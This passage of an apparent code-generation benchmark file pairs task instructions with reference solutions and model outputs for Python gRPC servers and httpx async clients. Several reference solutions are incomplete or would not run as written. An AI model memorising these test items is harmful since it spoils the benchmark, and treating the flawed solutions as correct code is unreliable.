    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom typing import Any\nfrom . import test_services_pb2, test_services_pb2_grpc\n\nclass ServiceImpl(test_services_pb2_grpc.DummyServiceServicer):\n    def Empty(self, request: Any, context) -> Any:\n        return test_services_pb2.Empty()\n\n    def SimpleTest(\n        self, request: test_services_pb2.DummyRequest, context: grpc.ServicerContext\n    ) -> test_services_pb2.DummyResponse:\n        if request.request_id > 1000:\n            context.abort(grpc.StatusCode.FAILED_PRECONDITION, \"number too big!\")\n        return test_services_pb2.DummyResponse(response_id=request.request_id + 1)\n\nclass GRPCServer:\n    def __init__(self, max_workers: int = 5):\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        self._service_impl = ServiceImpl()\n        test_services_pb2_grpc.add_DummyServiceServicer_to_server(self._service_impl, self._server)\n        \n        service_names = (\n            test_services_pb2.DESCRIPTOR.services_by_name[\"DummyService\"].full_name,\n            reflection.SERVICE_NAME,\n        )\n        reflection.enable_server_reflection(service_names, self._server)\n\n    def start(self, port: int) -> None:\n        self._server.add_insecure_port(f\"127.0.0.1:{port}\")\n        self._server.start()\n\n    def stop(self, grace_period: float = 1.0) -> None:\n        self._server.stop(grace_period)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport test_services_pb2\nimport test_services_pb2_grpc\nfrom typing import Any\n\nclass GRPCServer:\n    def __init__(self, max_workers: int = 5) -> None:\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        self._service_impl = self.ServiceImpl()\n        test_services_pb2_grpc.add_TestServiceServicer_to_server(self._service_impl, self._server)\n        self._server.add_insecure_port('[::]:0')  # Placeholder; will re-bind on start\n\n    def start(self, port: int) -> None:\n        self._server.stop(0)\n        self._server.add_insecure_port(f'[::]:{port}')\n        self._server.start()\n\n    def stop(self, grace_period: float = 1.0) -> None:\n        self._server.stop(grace_period)\n\n    class ServiceImpl(test_services_pb2_grpc.TestServiceServicer):\n        def Empty(self, request: Any, context) -> Any:\n            return test_services_pb2.Empty()\n\n        def SimpleTest(self, request: test_services_pb2.DummyRequest, context: grpc.ServicerContext) -> test_services_pb2.DummyResponse:\n            if not request.HasField('value'):\n                context.abort(grpc.StatusCode.INVALID_ARGUMENT, \"Missing required field: value\")\n            return test_services_pb2.DummyResponse(message=f\"Received: {request.value}\")"
  },
  {
    "Task_id": 499,
    "Instruction": "Task Description: Implement a gRPC server class that handles multiple protocols including health checks and service reflection, capable of serving JinaRPC requests asynchronously.\n\nClass Description: MultiProtocolGateway is a class that sets up and manages a gRPC server with support for JinaRPC services, health checks, and server reflection. It provides methods to start, run, and shutdown the server gracefully.\n\nAttributes:\n- grpc_port: int - The port number on which the gRPC server will listen\n- host: str - The host address to bind the server to (default: '0.0.0.0')\n- health_servicer: HealthServicer - The health check service implementation\n- grpc_server: grpc.aio.Server - The asynchronous gRPC server instance\n\nMethods:\n- __init__(grpc_port: int, host: str = '0.0.0.0') -> None - Initializes the gateway with specified port and host\n- _setup_grpc_server() -> None - Sets up the gRPC server with JinaRPC services, health checks, and reflection (asynchronous)\n- run_server() -> None - Starts the server and waits for termination (asynchronous)\n- shutdown() -> None - Gracefully shuts down the server (asynchronous)",
    "Canonical_solution": "import grpc\nfrom grpc_health.v1 import health, health_pb2, health_pb2_grpc\nfrom grpc_reflection.v1alpha import reflection\nfrom jina.proto import jina_pb2, jina_pb2_grpc\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int, host: str = '0.0.0.0'):\n        self.grpc_port = grpc_port\n        self.host = host\n        self.health_servicer = health.HealthServicer(experimental_non_blocking=True)\n\n    async def _setup_grpc_server(self):\n        self.grpc_server = grpc.aio.server()\n\n        jina_pb2_grpc.add_JinaRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        jina_pb2_grpc.add_JinaSingleDataRequestRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        service_names = (\n            jina_pb2.DESCRIPTOR.services_by_name['JinaRPC'].full_name,\n            reflection.SERVICE_NAME,\n        )\n        \n        health_pb2_grpc.add_HealthServicer_to_server(\n            self.health_servicer, self.grpc_server\n        )\n        \n        for service in service_names:\n            self.health_servicer.set(service, health_pb2.HealthCheckResponse.SERVING)\n            \n        reflection.enable_server_reflection(service_names, self.grpc_server)\n        self.grpc_server.add_insecure_port(f'{self.host}:{self.grpc_port}')\n        await self.grpc_server.start()\n\n    async def run_server(self):\n        await self.grpc_server.wait_for_termination()\n\n    async def shutdown(self):\n        await self.grpc_server.stop(0)\n        self.health_servicer.enter_graceful_shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom grpc_health.v1 import health_pb2_grpc, health_pb2\nfrom grpc_reflection.v1alpha import server_reflection\nimport asyncio\n\nclass JinaRPCServicer:\n    pass\n\nclass HealthServicer(health_pb2_grpc.HealthServicer):\n    def Check(self, request, context):\n        return health_pb2.HealthCheckResponse(\n            status=health_pb2.HealthCheckResponse.SERVING)\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int, host: str = '0.0.0.0') -> None:\n        self.grpc_port = grpc_port\n        self.host = host\n        self.health_servicer = HealthServicer()\n        self.grpc_server = None\n\n    async def _setup_grpc_server(self) -> None:\n        self.grpc_server = grpc.aio.server()\n        jina_rpc_servicer = JinaRPCServicer()\n        health_pb2_grpc.add_HealthServicer_to_server(self.health_servicer, self.grpc_server)\n        service_names = (\n            health_pb2.DESCRIPTOR.services_by_name['Health'].full_name,\n            server_reflection.SERVICE_NAME,\n        )\n        self.grpc_server.add_service(\n            server_reflection.ReflectionService().service_definition(service_names)\n        )\n        self.grpc_server.add_insecure_port(f'{self.host}:{self.grpc_port}')\n\n    async def run_server(self) -> None:\n        await self._setup_grpc_server()\n        await self.grpc_server.start()\n        await self.grpc_server.wait_for_termination()\n\n    async def shutdown(self) -> None:\n        await self.grpc_server.stop(grace=5)"
  },
  {
    "Task_id": 50,
    "Instruction": "Task Description: Implement asynchronous HTTP client functions to interact with a gacha information API, retrieving lists of available gacha and their detailed information.\n\nFunction Description: The code consists of two asynchronous functions that use httpx library to make HTTP requests to a gacha information API. The first function retrieves a list of available gacha, while the second fetches detailed information for a specific gacha using its ID.\n\nInput: \n- For `gacha_info_list()`: None\n- For `gacha_info(gacha_id)`: \n  - gacha_id: [str] - The unique identifier of the gacha to fetch details for\n\nOutput: \n- For `gacha_info_list()`: [list] - A list of available gacha items\n- For `gacha_info(gacha_id)`: [dict] - A dictionary containing detailed information about the specified gacha",
    "Canonical_solution": "import httpx\n\nBASE_URL = 'https://operation-webstatic.mihoyo.com/gacha_info/hk4e/cn_gf01/%s'\n\nasync def gacha_info_list():\n    async with httpx.AsyncClient() as client:\n        res = await client.get(url=BASE_URL % 'gacha/list.json')\n        json_data = res.json()\n        return json_data['data']['list']\n\nasync def gacha_info(gacha_id):\n    async with httpx.AsyncClient() as client:\n        res = await client.get(url=BASE_URL % gacha_id + '/zh-cn.json')\n        return res.json()",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nimport asyncio\n\nasync def gacha_info_list():\n    async with httpx.AsyncClient() as client:\n        response = await client.get(\"https://api.example.com/gacha/list\")\n        return response.json()\n\nasync def gacha_info(gacha_id):\n    async with httpx.AsyncClient() as client:\n        response = await client.get(f\"https://api.example.com/gacha/{gacha_id}\")\n        return response.json()"
  },
  {
    "Task_id": 500,
    "Instruction": "Task Description: Implement a gRPC server in Python that handles network compute bridge requests using thread pools for concurrency and inter-process communication queues for request/response handling.\n\nClass Description: NetworkComputeBridgeWorkerServicer is a gRPC servicer class that processes incoming network compute requests and model listing requests, using input/output queues for inter-process communication.\n\nAttributes:\n- thread_input_queue: [multiprocessing.Queue] - Queue for receiving incoming requests from gRPC clients\n- thread_output_queue: [multiprocessing.Queue] - Queue for sending responses back to gRPC clients\n\nMethods:\n- NetworkCompute: [Name](request, context) -> [network_compute_bridge_pb2.NetworkComputeResponse] - Processes a network compute request by putting it in the input queue and waiting for response from output queue\n- ListAvailableModels: [Name](request, context) -> [network_compute_bridge_pb2.ListAvailableModelsResponse] - Processes a model listing request by putting it in the input queue and waiting for response from output queue\n\nFunction Description: start_grpc_server creates and starts a gRPC server instance with thread pool executor, registers the servicer, and binds it to a specified port.\n\nInput:\n- port: [int] - The port number on which the gRPC server should listen\n\nOutput:\n- server: [grpc.Server] - The running gRPC server instance",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nimport multiprocessing\nfrom multiprocessing import Queue\nimport bosdyn.api.network_compute_bridge_service_pb2_grpc as network_compute_bridge_service_pb2_grpc\nimport bosdyn.api.network_compute_bridge_pb2 as network_compute_bridge_pb2\nimport bosdyn.api.header_pb2 as header_pb2\n\nREQUEST_QUEUE = Queue()\nRESPONSE_QUEUE = Queue()\n\nclass NetworkComputeBridgeWorkerServicer(network_compute_bridge_service_pb2_grpc.NetworkComputeBridgeWorkerServicer):\n    def __init__(self, thread_input_queue, thread_output_queue):\n        super(NetworkComputeBridgeWorkerServicer, self).__init__()\n        self.thread_input_queue = thread_input_queue\n        self.thread_output_queue = thread_output_queue\n\n    def NetworkCompute(self, request, context):\n        self.thread_input_queue.put(request)\n        out_proto = self.thread_output_queue.get()\n        return out_proto\n\n    def ListAvailableModels(self, request, context):\n        self.thread_input_queue.put(request)\n        out_proto = self.thread_output_queue.get()\n        return out_proto\n\ndef start_grpc_server(port):\n    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n    network_compute_bridge_service_pb2_grpc.add_NetworkComputeBridgeWorkerServicer_to_server(\n        NetworkComputeBridgeWorkerServicer(REQUEST_QUEUE, RESPONSE_QUEUE), server)\n    server.add_insecure_port(f'[::]:{port}')\n    server.start()\n    return server",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport multiprocessing\nimport network_compute_bridge_pb2\nimport network_compute_bridge_pb2_grpc\n\nclass NetworkComputeBridgeWorkerServicer(network_compute_bridge_pb2_grpc.NetworkComputeBridgeWorkerServicer):\n    def __init__(self, thread_input_queue, thread_output_queue):\n        self.thread_input_queue = thread_input_queue\n        self.thread_output_queue = thread_output_queue\n\n    def NetworkCompute(self, request, context):\n        self.thread_input_queue.put(request)\n        return self.thread_output_queue.get()\n\n    def ListAvailableModels(self, request, context):\n        self.thread_input_queue.put(request)\n        return self.thread_output_queue.get()\n\ndef start_grpc_server(port):\n    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n    thread_input_queue = multiprocessing.Queue()\n    thread_output_queue = multiprocessing.Queue()\n    servicer = NetworkComputeBridgeWorkerServicer(thread_input_queue, thread_output_queue)\n    network_compute_bridge_pb2_grpc.add_NetworkComputeBridgeWorkerServicer_to_server(servicer, server)\n    server.add_insecure_port(f'[::]:{port}')\n    server.start()\n    return server"
  },
  {
    "Task_id": 501,
    "Instruction": "Task Description: Implement a gRPC server class for Vizier service that handles concurrent requests and manages service lifecycle.\n\nClass Description: DefaultVizierServer is a class that sets up and manages a gRPC server for Vizier service, including initialization, startup, and configuration of related services. It handles concurrent requests using a thread pool and provides access to the server's datastore and endpoint.\n\nAttributes:\n- _host: [str] - The host address where the server will run (default: 'localhost')\n- _database_url: [Optional[str]] - URL for the database connection\n- _policy_factory: [Any] - Factory for creating policy objects (default: service_policy_factory_lib.DefaultPolicyFactory)\n- _early_stop_recycle_period: [datetime.timedelta] - Time period for early stop recycling (default: 0.1 seconds)\n- _port: [int] - The port number selected for the server\n- _servicer: [Any] - The Vizier service implementation\n- _server: [grpc.Server] - The gRPC server instance\n- stub: [Any] - The client stub for the server\n\nMethods:\n- __init__(host: str = 'localhost', database_url: Optional[str] = None, policy_factory=None, early_stop_recycle_period: datetime.timedelta = datetime.timedelta(seconds=0.1)) -> None - Initializes the server with configuration parameters\n- datastore() -> [property] - Returns the datastore from the servicer\n- endpoint() -> [property] - Returns the server endpoint as 'host:port'\n- start() -> None - Starts the gRPC server and initializes services\n- wait_for_early_stop_recycle_period() -> None - Waits for the configured early stop recycle period",
    "Canonical_solution": "from concurrent import futures\nimport datetime\nimport time\nfrom typing import Optional\nimport grpc\nimport portpicker\nfrom vizier._src.service import vizier_service\nfrom vizier._src.service import vizier_service_pb2_grpc\nfrom vizier._src.service import stubs_util\nfrom vizier._src.service import pythia_service\nfrom vizier._src.service import pythia_service_pb2_grpc\n\nclass DefaultVizierServer:\n    def __init__(self, host: str = 'localhost', database_url: Optional[str] = None, \n                 policy_factory=None, early_stop_recycle_period: datetime.timedelta = datetime.timedelta(seconds=0.1)):\n        self._host = host\n        self._database_url = database_url\n        self._policy_factory = policy_factory or service_policy_factory_lib.DefaultPolicyFactory\n        self._early_stop_recycle_period = early_stop_recycle_period\n        self._port = portpicker.pick_unused_port()\n        \n        # Initialize non-user-settable fields\n        self._servicer = None\n        self._server = None\n        self.stub = None\n\n    @property\n    def datastore(self):\n        return self._servicer.datastore\n\n    @property\n    def endpoint(self):\n        return f'{self._host}:{self._port}'\n\n    def start(self):\n        # Setup Vizier server\n        self._servicer = vizier_service.VizierServicer(\n            database_url=self._database_url,\n            early_stop_recycle_period=self._early_stop_recycle_period\n        )\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=30))\n        vizier_service_pb2_grpc.add_VizierServiceServicer_to_server(\n            self._servicer, self._server\n        )\n        self._server.add_insecure_port(self.endpoint)\n        self._server.start()\n        self.stub = stubs_util.create_vizier_server_stub(self.endpoint)\n\n        # Setup default Pythia Service\n        default_pythia_service = pythia_service.PythiaServicer(\n            self._servicer, policy_factory=self._policy_factory\n        )\n        self._servicer.default_pythia_service = default_pythia_service\n\n    def wait_for_early_stop_recycle_period(self):\n        time.sleep(self._early_stop_recycle_period.total_seconds())",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import abc\nfrom datetime import timedelta\nfrom typing import Optional, Any\nimport grpc\nfrom concurrent import futures\n\nclass DefaultVizierServer:\n    def __init__(self, host: str = 'localhost', database_url: Optional[str] = None, policy_factory=None, early_stop_recycle_period: timedelta = timedelta(seconds=0.1)):\n        self._host = host\n        self._database_url = database_url\n        self._policy_factory = policy_factory if policy_factory else service_policy_factory_lib.DefaultPolicyFactory\n        self._early_stop_recycle_period = early_stop_recycle_period if early_stop_recycle_period else timedelta(seconds=0.1)\n        self._port = 0\n        self._servicer = None\n        self._server = None\n        self.stub = None\n\n    @property\n    def datastore(self):\n        return self._servicer.datastore if self._servicer else None\n\n    @property\n    def endpoint(self):\n        return f\"{self._host}:{self._port}\" if self._port else None\n\n    def start(self):\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n        self._servicer = self._create_servicer()\n        self._add_servicer_to_server(self._servicer, self._server)\n        self._port = self._server.add_insecure_port(f\"{self._host}:0\")\n        self._server.start()\n\n    def wait_for_early_stop_recycle_period(self):\n        import time\n        time.sleep(self._early_stop_recycle_period.total_seconds())\n\n    def _create_servicer(self):\n        raise NotImplementedError(\"Subclasses must implement _create_servicer\")\n\n    def _add_servicer_to_server(self, servicer, server):\n        raise NotImplementedError(\"Subclasses must implement _add_servicer_to_server\")"
  },
  {
    "Task_id": 502,
    "Instruction": "Task Description: Create a gRPC server in Python that handles incoming requests using a thread pool for concurrency and implements a dummy API for testing purposes.\n\nClass Description: The DummyServer class implements a gRPC server that listens on a specified address and handles incoming requests through a servicer class. It manages server lifecycle and provides a simple echo service.\n\nAttributes:\n- server: [grpc.Server] - The gRPC server instance configured with thread pool executor and message size limits\n- bind_address: [str] - The network address and port where the server will listen for incoming connections\n\nMethods:\n- __init__: [Name](bind_address: str) -> None - Initializes the gRPC server with thread pool executor, configures message size limits, and binds to the specified address\n- __enter__: [Name]() -> DummyServer - Starts the server and returns the instance (for context manager usage)\n- __exit__: [Name](exc_type, exc_val, exc_tb) -> None - Stops the server when exiting context (for context manager usage)\n- GNESServicer.dummyAPI: [Name](request, context) -> request - Servicer method that echoes back received requests (implements dummy API)",
    "Canonical_solution": "import os\nimport grpc\nfrom concurrent.futures import ThreadPoolExecutor\nfrom tests.proto_s import dummy_pb2_grpc\n\nclass DummyServer:\n    def __init__(self, bind_address):\n        self.server = grpc.server(\n            ThreadPoolExecutor(max_workers=1),\n            options=[('grpc.max_send_message_length', 1 * 1024 * 1024),\n                     ('grpc.max_receive_message_length', 1 * 1024 * 1024)])\n        dummy_pb2_grpc.add_DummyGRPCServiceServicer_to_server(self.GNESServicer(), self.server)\n        self.bind_address = bind_address\n        self.server.add_insecure_port(self.bind_address)\n\n    def __enter__(self):\n        self.server.start()\n        print('dummy server is listening at: %s' % self.bind_address)\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        self.server.stop(None)\n\n    class GNESServicer(dummy_pb2_grpc.DummyGRPCServiceServicer):\n        def dummyAPI(self, request, context):\n            print('the dummy server received something: %s' % request)\n            return request",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport dummy_pb2\nimport dummy_pb2_grpc\n\nclass DummyServer:\n    def __init__(self, bind_address):\n        self.bind_address = bind_address\n        self.server = grpc.server(\n            futures.ThreadPoolExecutor(max_workers=10),\n            options=[\n                ('grpc.max_send_message_length', 50 * 1024 * 1024),\n                ('grpc.max_receive_message_length', 50 * 1024 * 1024)\n            ]\n        )\n        self.servicer = self.GNESServicer()\n        dummy_pb2_grpc.add_GNESServicer_to_server(self.servicer, self.server)\n\n    def __enter__(self):\n        self.server.add_insecure_port(self.bind_address)\n        self.server.start()\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        self.server.stop(0)\n\n    class GNESServicer(dummy_pb2_grpc.GNESServicer):\n        def dummyAPI(self, request, context):\n            return request"
  },
  {
    "Task_id": 51,
    "Instruction": "Task Description: Create an asynchronous function to check the health status of a server by querying its live and ready endpoints.\n\nFunction Description: The function uses httpx.AsyncClient to asynchronously send HTTP GET requests to a server's health endpoints (/v1/health/live and /v1/health/ready). It returns a tuple indicating whether the server is live and ready based on the HTTP status codes received.\n\nInput: \n- url (str): The base URL of the server to check\n\nOutput: \n- Tuple[bool, bool]: A tuple where the first element indicates if the server is live (HTTP 200 status) and the second element indicates if the server is ready (HTTP 200 status)",
    "Canonical_solution": "from typing import Tuple\nimport httpx\n\nasync def _get_health(url: str) -> Tuple[bool, bool]:\n    \"\"\"\n    Query {url}/v1/health/{live,ready} to check if the server is running and ready\n\n    Args:\n        url (str): URL of the server\n\n    Returns:\n        Tuple[bool, bool]: (is_live, is_ready)\n    \"\"\"\n    async with httpx.AsyncClient() as client:\n        live = await client.get(f\"{url}/v1/health/live\")\n        ready = await client.get(f\"{url}/v1/health/ready\")\n        return live.status_code == 200, ready.status_code == 200",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nfrom typing import Tuple\n\nasync def check_server_health(url: str) -> Tuple[bool, bool]:\n    async with httpx.AsyncClient() as client:\n        live_response = await client.get(f\"{url}/v1/health/live\")\n        ready_response = await client.get(f\"{url}/v1/health/ready\")\n    \n    is_live = live_response.status_code == 200\n    is_ready = ready_response.status_code == 200\n    return (is_live, is_ready)"
  },
  {
    "Task_id": 52,
    "Instruction": "Task Description: Create an asynchronous function to send an HTTP POST request with candidate and role data to a specified endpoint, and return the response as a dictionary.\n\nFunction Description: The function uses httpx.AsyncClient to asynchronously send a POST request containing candidate information and role details to a server endpoint. It handles the response by converting it to JSON format and returns the result. The function is designed to be non-blocking and should be called within an async context.\n\nInput:\n- candidates: list[dict] - A list of candidate dictionaries, each containing:\n  - name: str - The candidate's name\n  - self_identified_seniority: int - The candidate's self-assessed seniority level\n  - bio: str - The candidate's biography/description\n- role: dict - A dictionary containing role details:\n  - title: str - The job title\n  - desired_seniority: int - The desired seniority level for the role\n  - description: str - The job description\n\nOutput:\n- dict - The JSON-decoded response from the server containing the processed results",
    "Canonical_solution": "import asyncio\nimport json\nimport httpx\n\nasync def send_http_request(candidates: list, role: dict) -> dict:\n    async with httpx.AsyncClient() as client:\n        response = await client.post(\n            \"http://localhost:8000/interview\",\n            json={\"candidates\": candidates, \"role\": role},\n        )\n        result = response.json()\n        return result\n\nif __name__ == \"__main__\":\n    candidates = [\n        {\n            \"name\": \"Alice\",\n            \"self_identified_seniority\": 3,\n            \"bio\": \"10 years with postgres, 5 years with python, 3 years with django.\",\n        },\n        {\n            \"name\": \"Bob\",\n            \"self_identified_seniority\": 1,\n            \"bio\": \"I just graduated from a coding bootcamp and I'm ready to take on the world!\",\n        },\n        {\n            \"name\": \"Charlie\",\n            \"self_identified_seniority\": 2,\n            \"bio\": \"graduated 2 years ago and i can make you a react app in no time\",\n        },\n        {\n            \"name\": \"David\",\n            \"self_identified_seniority\": 3,\n            \"bio\": \"i just been riding that SCRUM wave for 10 years fam\",\n        },\n    ]\n    role = {\n        \"title\": \"Senior Software Engineer\",\n        \"desired_seniority\": 3,\n        \"description\": \"Build and maintain a large-scale web application with a team of 10+ engineers.\",\n    }\n    result = asyncio.run(send_http_request(candidates, role))\n    print(json.dumps(result, indent=2))",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nfrom typing import List, Dict\n\nasync def send_candidate_role_data(candidates: List[Dict], role: Dict) -> Dict:\n    async with httpx.AsyncClient() as client:\n        payload = {\n            \"candidates\": [\n                {\n                    \"name\": candidate[\"name\"],\n                    \"self_identified_seniority\": candidate[\"self_identified_seniority\"],\n                    \"bio\": candidate[\"bio\"]\n                } for candidate in candidates\n            ],\n            \"role\": {\n                \"title\": role[\"title\"],\n                \"desired_seniority\": role[\"desired_seniority\"],\n                \"description\": role[\"description\"]\n            }\n        }\n        response = await client.post(\"https://api.example.com/submit-candidate-role\", json=payload)\n        return response.json()"
  },
  {
    "Task_id": 53,
    "Instruction": "Task Description: Create an asynchronous function to fetch data from a specified URL using HTTP GET request with customizable headers, handling potential HTTP errors.\n\nFunction Description: The function uses httpx library with asyncio to make asynchronous HTTP requests. It creates an async client, sends a GET request to the provided URL, checks for successful response status, and returns the response object. Default headers are provided but can be overridden.\n\nInput:\n- url: str - The target URL to fetch data from\n- headers: dict (optional) - Custom headers to include in the request (defaults to common browser User-Agent if not provided)\n\nOutput:\n- Returns: httpx.Response - The HTTP response object containing status code, headers, and content\n- Raises: httpx.HTTPStatusError - If the response status code indicates an error (4xx or 5xx)",
    "Canonical_solution": "import os\nimport httpx\nimport aiofiles\n\nasync def fetch_data(url: str, headers: dict = None):\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'\n    } if headers is None else headers.get('headers')\n    async with httpx.AsyncClient() as client:\n        response = await client.get(url, headers=headers)\n        response.raise_for_status()  # Ensure successful response\n        return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nimport asyncio\n\nasync def fetch_data(url: str, headers: dict = None):\n    async with httpx.AsyncClient() as client:\n        response = await client.get(url, headers=headers)\n        response.raise_for_status()\n        return response"
  },
  {
    "Task_id": 54,
    "Instruction": "Task Description: Implement an asynchronous function to fetch and filter GitHub contributors for a repository, then retrieve their detailed user information.\n\nFunction Description: This function asynchronously retrieves contributors from a GitHub repository using the GitHub API, filters them based on specific criteria (user type, ignored logins, and acknowledgements), and then fetches detailed information for each qualifying contributor. The function uses httpx for asynchronous HTTP requests and handles pagination to retrieve all contributors.\n\nInput:\n- auth: Tuple[str, str] - A tuple containing GitHub username and password/token for authentication\n- GITHUB_API_CONTRIBUTORS: str - The GitHub API endpoint for contributors\n- PER_PAGE: int - Number of contributors to fetch per page\n- GITHUB_USER_TYPE: str - The type of contributor to filter for (e.g., 'User')\n- IGNORED_AUTHOR_LOGINS: List[str] - List of GitHub logins to ignore\n- ACKNOWLEDGEMENTS: str - String containing acknowledged contributors to exclude\n\nOutput:\n- List[Dict] - A list of dictionaries containing detailed user information for unacknowledged contributors who meet the filtering criteria",
    "Canonical_solution": "import asyncio\nimport httpx\n\nasync def main():\n    auth = (input(\"Github Username: \"), getpass())\n    async with httpx.AsyncClient() as client:\n        page = 0\n        results = []\n        contributors = []\n        while not page or len(results) == PER_PAGE:\n            page += 1\n            response = await client.get(\n                f\"{GITHUB_API_CONTRIBUTORS}?per_page={PER_PAGE}&page={page}\", auth=auth\n            )\n            results = response.json()\n            contributors.extend(\n                (\n                    contributor\n                    for contributor in results\n                    if contributor[\"type\"] == GITHUB_USER_TYPE\n                    and contributor[\"login\"] not in IGNORED_AUTHOR_LOGINS\n                    and f\"@{contributor['login'].lower()}\" not in ACKNOWLEDGEMENTS\n                )\n            )\n\n        unacknowledged_users = await asyncio.gather(\n            *(client.get(contributor[\"url\"], auth=auth) for contributor in contributors)\n        )\n        unacknowledged_users = [request.json() for request in unacknowledged_users]",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nfrom typing import Tuple, List, Dict\nimport asyncio\n\nasync def fetch_contributor_details(auth: Tuple[str, str], GITHUB_API_CONTRIBUTORS: str, PER_PAGE: int, GITHUB_USER_TYPE: str, IGNORED_AUTHOR_LOGINS: List[str], ACKNOWLEDGEMENTS: str) -> List[Dict]:\n    async with httpx.AsyncClient(auth=auth, timeout=30) as client:\n        page = 1\n        contributors = []\n        \n        while True:\n            response = await client.get(f\"{GITHUB_API_CONTRIBUTORS}?page={page}&per_page={PER_PAGE}\")\n            if response.status_code != 200:\n                break\n            data = response.json()\n            if not data:\n                break\n            \n            for contributor in data:\n                if contributor['login'] in IGNORED_AUTHOR_LOGINS or contributor['login'] in ACKNOWLEDGEMENTS or contributor['type'] != GITHUB_USER_TYPE:\n                    continue\n                contributors.append(contributor)\n            page += 1\n        \n        details_tasks = [client.get(contributor['url']) for contributor in contributors]\n        details_responses = await asyncio.gather(*details_tasks)\n        detailed_contributors = [resp.json() for resp in details_responses if resp.status_code == 200]\n        \n        return detailed_contributors"
  },
  {
    "Task_id": 57,
    "Instruction": "Task Description: Implement a function to send audio data to the Hugging Face Whisper ASR (Automatic Speech Recognition) model API and retrieve the transcribed text.\n\nFunction Description: The function `get_audio_transcript` takes audio data in base64-encoded string format, decodes it, sends it to the Hugging Face Whisper API, and returns the transcribed text. It handles errors and exceptions appropriately, providing feedback if the API request fails.\n\nInput:\n- `ctx`: [Context] - The context object for sending responses or errors back to the caller.\n- `sender`: [str] - Identifier for the sender to direct the response to.\n- `audiodata`: [str] - Base64-encoded string representing the audio data to be transcribed.\n\nOutput:\n- The function does not return a value directly but sends the result or error back through the `ctx` object:\n  - On success: Sends an `AudioTranscriptResponse` containing the transcribed text.\n  - On failure: Sends an `Error` containing the error message from the API or exception details.",
    "Canonical_solution": "import os\nimport requests\nimport base64\n\nHUGGING_FACE_ACCESS_TOKEN = os.getenv(\n    \"HUGGING_FACE_ACCESS_TOKEN\", \"HUGGING_FACE_ACCESS_TOKEN\")\n\nWHISPER_URL = \"https://api-inference.huggingface.co/models/openai/whisper-large-v2\"\n\nHEADERS = {\n    \"Authorization\": f\"Bearer {HUGGING_FACE_ACCESS_TOKEN}\"\n}\n\nasync def get_audio_transcript(ctx: Context, sender: str, audiodata: str):\n    try:\n        audiodata = audiodata.encode(\"ascii\")\n        audioBytes = base64.b64decode(audiodata)\n\n        response = requests.post(WHISPER_URL, headers=HEADERS, data=audioBytes)\n\n        if response.status_code != 200:\n            await ctx.send(sender, Error(error=f\"Error: {response.json().get('error')}\"))\n            return\n\n        await ctx.send(sender, AudioTranscriptResponse(transcript=response.json().get('text')))\n        return\n\n    except Exception as ex:\n        await ctx.send(sender, Error(error=f\"Exception detail: {ex}\"))\n        return",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import base64\nimport io\nimport requests\nfrom typing import Optional\n\ndef get_audio_transcript(ctx, sender: str, audiodata: str):\n    try:\n        audio_bytes = base64.b64decode(audiodata)\n        files = {\"file\": (\"audio.wav\", io.BytesIO(audio_bytes), \"audio/wav\")}\n        response = requests.post(\"https://api-inference.huggingface.co/models/openai/whisper-large-v2\", files=files)\n        if response.status_code == 200:\n            transcript = response.json().get(\"text\", \"\")\n            ctx.send(sender, AudioTranscriptResponse(transcript=transcript))\n        else:\n            error_msg = response.json().get(\"error\", f\"API request failed with status code {response.status_code}\")\n            ctx.send(sender, Error(message=str(error_msg)))\n    except Exception as e:\n        ctx.send(sender, Error(message=str(e)))"
  },
  {
    "Task_id": 6,
    "Instruction": "Task Description: Implement an HTTP connection pool class to manage and reuse HTTP connections efficiently, supporting both HTTP and HTTPS protocols with configurable pooling behavior.\n\nClass Description: HTTPConnectionPool is a connection pooling implementation that manages a pool of HTTP/HTTPS connections to a specific host, allowing for connection reuse and efficient resource management. It handles connection creation, retrieval, and release with support for timeouts, retries, and proxy configurations.\n\nAttributes:\n- scheme: str - The URL scheme (either \"http\" or \"https\")\n- ConnectionCls: class - The connection class to use (HTTPConnection or HTTPSConnection)\n- QueueCls: class - The queue class to use for connection pooling (default: queue.LifoQueue)\n- host: str - The target host for connections\n- port: Optional[int] - The target port for connections\n- timeout: Union[Timeout, float, None] - Connection and read timeout settings\n- retries: Union[Retry, bool, int, None] - Retry configuration for failed requests\n- pool: queue.LifoQueue - The connection pool queue\n- block: bool - Whether to block when pool is full/empty\n- proxy: Optional[Url] - Proxy configuration\n- proxy_headers: Optional[Mapping[str, str]] - Headers for proxy connections\n- headers: Optional[Mapping[str, str]] - Default headers for requests\n- conn_kw: Any - Additional connection keyword arguments\n\nMethods:\n- __init__(host: str, port: Optional[int] = None, timeout: Union[Timeout, float, None] = 